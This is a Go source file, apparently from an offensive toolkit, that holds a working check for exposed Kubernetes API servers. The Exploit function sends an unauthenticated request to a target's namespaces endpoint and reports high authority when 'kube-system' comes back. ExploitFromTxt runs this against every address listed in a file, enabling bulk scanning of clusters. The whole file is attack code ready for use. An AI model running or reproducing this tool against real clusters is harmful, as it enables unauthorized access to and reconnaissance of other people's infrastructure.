package k8sapiserver

import (
    "bufio"
    "fmt"
    "io"
    "log"
    "net/http"
    "os"
    "strings"
)

func Exploit(apiaddr string) {
    if !Check(apiaddr) {
        return
    }

    log.Println("trying to list namespaces")

    namespacesURL := fmt.Sprintf("%s/api/v1/namespaces", apiaddr)
    log.Println(namespacesURL)

    namespacesResp, err := http.Get(namespacesURL)
    if err != nil {
        log.Printf("请求命名空间失败: %v", err)
        return
    }
    defer namespacesResp.Body.Close()

    namespacesBody, err := io.ReadAll(namespacesResp.Body)
    if err != nil {
        log.Printf("读取命名空间响应失败: %v", err)
        return
    }

    log.Println(string(namespacesBody))

    if strings.Contains(string(namespacesBody), "kube-system") {
        log.Println("success, the pod role have a high authority.")
    } else {
        log.Printf("可以访问%s，但是没有权限访问/api/v1/namespaces", namespacesURL)
    }
}

func ExploitFromTxt(filePath string) {
    file, err := os.Open(filePath)
    if err != nil {
        log.Fatalf("无法打开文件: %v", err)
    }
    defer file.Close()

    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        apiaddr := scanner.Text()
        log.Printf("处理URL: %s", apiaddr)
        Exploit(apiaddr)
    }

    if err := scanner.Err(); err != nil {
        log.Fatalf("读取文件时出错: %v", err)
    }
}